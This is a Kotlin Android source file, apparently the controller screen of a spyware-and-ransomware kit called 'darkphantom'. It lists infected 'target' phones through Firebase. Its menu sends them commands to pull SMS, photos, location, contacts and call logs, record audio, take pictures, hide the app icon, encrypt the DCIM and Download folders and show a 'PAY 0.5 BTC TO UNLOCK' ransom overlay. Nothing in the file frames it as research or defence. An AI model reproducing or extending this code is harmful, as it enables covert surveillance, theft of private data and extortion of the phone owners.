package com.genetic.darkphantom.activities

import android.os.Bundle
import android.widget.Toast
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.recyclerview.widget.LinearLayoutManager
import androidx.recyclerview.widget.RecyclerView
import com.genetic.darkphantom.R
import com.genetic.darkphantom.managers.FirebaseManager
import com.genetic.darkphantom.models.Device
import com.google.firebase.database.*

class DeviceListActivity : AppCompatActivity() {
    private lateinit var rvDevices: RecyclerView
    private val devices = mutableListOf<Device>()
    private lateinit var adapter: DeviceAdapter
    private lateinit var listener: ChildEventListener

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_device_list)

        rvDevices = findViewById(R.id.rvDevices)
        rvDevices.layoutManager = LinearLayoutManager(this)

        adapter = DeviceAdapter(devices) { device ->
            showActionDialog(device)
        }
        rvDevices.adapter = adapter

        listenDevices()
    }

    private fun listenDevices() {
        listener = object : ChildEventListener {
            override fun onChildAdded(snapshot: DataSnapshot, previousChildName: String?) {
                val device = snapshot.getValue(Device::class.java)?.apply {
                    id = snapshot.key ?: ""
                }
                device?.let {
                    devices.add(it)
                    adapter.notifyDataSetChanged()
                }
            }

            override fun onChildChanged(snapshot: DataSnapshot, previousChildName: String?) {
                val device = snapshot.getValue(Device::class.java)?.apply {
                    id = snapshot.key ?: ""
                }
                device?.let {
                    val index = devices.indexOfFirst { it.id == device.id }
                    if (index != -1) {
                        devices[index] = device
                        adapter.notifyItemChanged(index)
                    }
                }
            }

            override fun onChildRemoved(snapshot: DataSnapshot) {
                val id = snapshot.key ?: return
                val index = devices.indexOfFirst { it.id == id }
                if (index != -1) {
                    devices.removeAt(index)
                    adapter.notifyItemRemoved(index)
                }
            }

            override fun onChildMoved(snapshot: DataSnapshot, previousChildName: String?) {}
            override fun onCancelled(error: DatabaseError) {
                Toast.makeText(this@DeviceListActivity, "Error: ${error.message}", Toast.LENGTH_SHORT).show()
            }
        }
        FirebaseManager.devicesRef.addChildEventListener(listener)
    }

    private fun showActionDialog(device: Device) {
        val actions = arrayOf(
            "📱 Ambil SMS Terbaru",
            "🖼️ Ambil Semua Galeri",
            "📍 Ambil Lokasi",
            "📞 Ambil Kontak & Call Logs",
            "🎙️ Rekam Audio (10 detik)",
            "📸 Ambil Foto (Back Camera)",
            "🔒 Kunci Layar",
            "💀 Ransomware Encrypt Files",
            "🎭 Tampilkan Overlay Ransom",
            "📨 Kirim SMS",
            "📲 Kirim WhatsApp",
            "🔕 Spam Notifikasi (50x)",
            "👻 Hide Icon",
            "💣 Ambil SEMUA DATA"
        )

        AlertDialog.Builder(this)
            .setTitle("🎯 Target: ${device.model}")
            .setItems(actions) { _, which ->
                when (which) {
                    0 -> sendCommand(device.id, "GET_SMS", mapOf("limit" to 50))
                    1 -> sendCommand(device.id, "GET_GALLERY", emptyMap())
                    2 -> sendCommand(device.id, "GET_LOCATION", emptyMap())
                    3 -> sendCommand(device.id, "GET_CONTACTS_AND_LOGS", emptyMap())
                    4 -> sendCommand(device.id, "START_RECORD", mapOf("duration" to 10))
                    5 -> sendCommand(device.id, "TAKE_PHOTO", mapOf("side" to "back"))
                    6 -> sendCommand(device.id, "LOCK_SCREEN", emptyMap())
                    7 -> sendCommand(device.id, "ENCRYPT_FILES", mapOf("folders" to listOf("DCIM", "Download")))
                    8 -> sendCommand(device.id, "SHOW_OVERLAY", mapOf("message" to "PAY 0.5 BTC TO UNLOCK"))
                    9 -> showSendSmsDialog(device.id)
                    10 -> showSendWhatsAppDialog(device.id)
                    11 -> sendCommand(device.id, "SPAM_NOTIF", mapOf("count" to 50))
                    12 -> sendCommand(device.id, "HIDE_ICON", emptyMap())
                    13 -> sendCommand(device.id, "GET_ALL_DATA", emptyMap())
                }
            }
            .setNegativeButton("Batal", null)
            .show()
    }

    private fun sendCommand(deviceId: String, action: String, params: Map<String, Any>) {
        val command = mapOf(
            "action" to action,
            "params" to params,
            "timestamp" to System.currentTimeMillis()
        )
        FirebaseManager.commandsRef.child(deviceId).push().setValue(command)
        Toast.makeText(this, "✅ Perintah dikirim ke $deviceId", Toast.LENGTH_SHORT).show()
    }

    private fun showSendSmsDialog(deviceId: String) {
        // Simpel, biar ga panjang
        Toast.makeText(this, "Fitur SMS via dialog (implement sendiri)", Toast.LENGTH_SHORT).show()
    }

    private fun showSendWhatsAppDialog(deviceId: String) {
        Toast.makeText(this, "Fitur WhatsApp via dialog (implement sendiri)", Toast.LENGTH_SHORT).show()
    }

    override fun onDestroy() {
        super.onDestroy()
        FirebaseManager.devicesRef.removeEventListener(listener)
    }

    // Adapter
    inner class DeviceAdapter(
        private val list: List<Device>,
        private val onClick: (Device) -> Unit
    ) : RecyclerView.Adapter<DeviceAdapter.ViewHolder>() {

        override fun onCreateViewHolder(parent: ViewGroup, viewType: Int): ViewHolder {
            val view = layoutInflater.inflate(R.layout.item_device, parent, false)
            return ViewHolder(view)
        }

        override fun onBindViewHolder(holder: ViewHolder, position: Int) {
            val device = list[position]
            holder.tvModel.text = device.model
            holder.tvBattery.text = "🔋 ${device.battery}%"
            holder.tvStatus.text = if (device.online == true) "● ONLINE" else "○ OFFLINE"
            holder.itemView.setOnClickListener { onClick(device) }
        }

        override fun getItemCount() = list.size

        inner class ViewHolder(view: View) : RecyclerView.ViewHolder(view) {
            val tvModel = view.findViewById<android.widget.TextView>(R.id.tvModel)
            val tvBattery = view.findViewById<android.widget.TextView>(R.id.tvBattery)
            val tvStatus = view.findViewById<android.widget.TextView>(R.id.tvStatus)
        }
    }
}
